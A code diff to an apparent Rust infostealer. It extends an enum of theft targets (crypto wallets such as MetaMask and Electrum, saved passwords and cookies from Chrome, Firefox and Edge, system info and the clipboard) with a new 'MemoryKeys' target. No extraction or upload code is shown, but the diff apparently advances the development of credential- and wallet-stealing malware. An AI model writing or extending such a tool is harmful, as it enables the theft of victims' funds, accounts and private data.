@@ -10,7 +10,7 @@ pub enum ExtractionTarget {
     BitcoinCore,
     TrustWallet,
     AtomicWallet,
-    
+
     // Browsers
     ChromePasswords,
     ChromeCookies,
@@ -18,12 +18,15 @@ pub enum ExtractionTarget {
     FirefoxPasswords,
     FirefoxCookies,
     EdgePasswords,
-    
+
     // System
     SystemInfo,
     NetworkInfo,
     HardwareInfo,
     Clipboard,
+
+    // Memory
+    MemoryKeys,
 }
 
 impl ExtractionTarget {
@@ -35,30 +38,34 @@ impl ExtractionTarget {
             Self::BitcoinCore => "bitcoin_core",
             Self::TrustWallet => "trust_wallet",
             Self::AtomicWallet => "atomic_wallet",
-            
+
             Self::ChromePasswords => "chrome_passwords",
             Self::ChromeCookies => "chrome_cookies",
             Self::ChromeHistory => "chrome_history",
             Self::FirefoxPasswords => "firefox_passwords",
             Self::FirefoxCookies => "firefox_cookies",
             Self::EdgePasswords => "edge_passwords",
-            
+
             Self::SystemInfo => "system_info",
             Self::NetworkInfo => "network_info",
             Self::HardwareInfo => "hardware_info",
             Self::Clipboard => "clipboard",
+
+            Self::MemoryKeys => "memory_keys",
         }
     }
-    
+
     pub fn category(&self) -> &'static str {
         match self {
-            Self::MetaMask | Self::Exodus | Self::Electrum | 
+            Self::MetaMask | Self::Exodus | Self::Electrum |
             Self::BitcoinCore | Self::TrustWallet | Self::AtomicWallet => "wallet",
-            
+
             Self::ChromePasswords | Self::ChromeCookies | Self::ChromeHistory |
             Self::FirefoxPasswords | Self::FirefoxCookies | Self::EdgePasswords => "browser",
-            
+
             Self::SystemInfo | Self::NetworkInfo | Self::HardwareInfo | Self::Clipboard => "system",
+
+            Self::MemoryKeys => "memory",
         }
     }
 }
